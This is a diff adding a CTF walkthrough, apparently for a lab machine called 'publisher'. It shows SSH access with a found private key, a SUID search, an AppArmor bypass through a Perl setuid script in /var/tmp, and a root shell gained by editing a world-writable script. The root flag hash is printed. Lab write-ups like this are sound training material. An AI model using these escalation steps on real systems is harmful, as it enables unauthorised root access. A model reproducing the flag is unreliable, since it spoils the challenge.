@@ -83,3 +83,72 @@ Gained shell access and navigated the system as user think.
 
 Captured the user.txt flag.
 
+FLAG 2 ! 
+I found the SSH private key for user think in /home/think/.ssh/id_rsa.
+
+I downloaded the key locally and successfully connected via SSH:
+
+ssh -i id_rsa think@10.201.77.224
+think@publisher:~$
+I discovered that AppArmor is installed on the machine:
+
+ls -l /etc/ | grep apparmor
+drwxr-xr-x 3 root root 4096 Dec 8 2023 apparmor
+drwxr-xr-x 8 root root 4096 Feb 12 2025 apparmor.d
+I searched for SUID programs owned by root:
+
+find / -user root -perm -4000 2>/dev/null
+I found the program /usr/sbin/run_container.
+
+When I ran it, I saw an error indicating it executes the script /opt/run_container.sh:
+
+bash
+Copy
+Edit
+/opt/run_container.sh: line 16: validate_container_id: command not found
+I checked the permissions of /opt/run_container.sh:
+
+ls -l /opt/run_container.sh
+-rwxrwxrwx 1 root root 1715 Jan 10 12:40 /opt/run_container.sh
+I tried to overwrite the script to get a reverse shell, but permission was denied due to AppArmor restrictions:
+
+echo "/bin/bash -i" > /opt/run_container.sh
+ash: /opt/run_container.sh: Permission denied
+I analyzed the AppArmor profile applied to the current shell /usr/sbin/ash:
+
+cat /etc/apparmor.d/usr.sbin.ash
+It showed that writing to /opt/ is denied, but writing to /var/tmp/ is allowed.
+
+I confirmed I can write to /var/tmp/:
+
+bash
+Copy
+Edit
+touch /var/tmp/test
+ls -l /var/tmp/test
+-rw-rw-r-- 1 think think 0 ...
+I created a Perl script /var/tmp/test.pl to elevate privileges to root:
+
+#!/usr/bin/perl
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec "/bin/sh";
+I made it executable and ran it:
+
+chmod +x /var/tmp/test.pl
+/var/tmp/test.pl
+echo $0
+/bin/sh
+Then I edited /opt/run_container.sh to add a privileged shell invocation with the -p option:
+
+#!/bin/bash
+/bin/bash -p  # added line
+After that, I ran /usr/sbin/run_container and got a root shell:
+
+/usr/sbin/run_container
+bash-5.0# whoami
+
+bash-5.0# cat /root/root.txt
+3a4225cc9e85709adda6ef55d6a4f2ca
+
+Due to a temporary GitHub error, I was unable to upload images for the report.
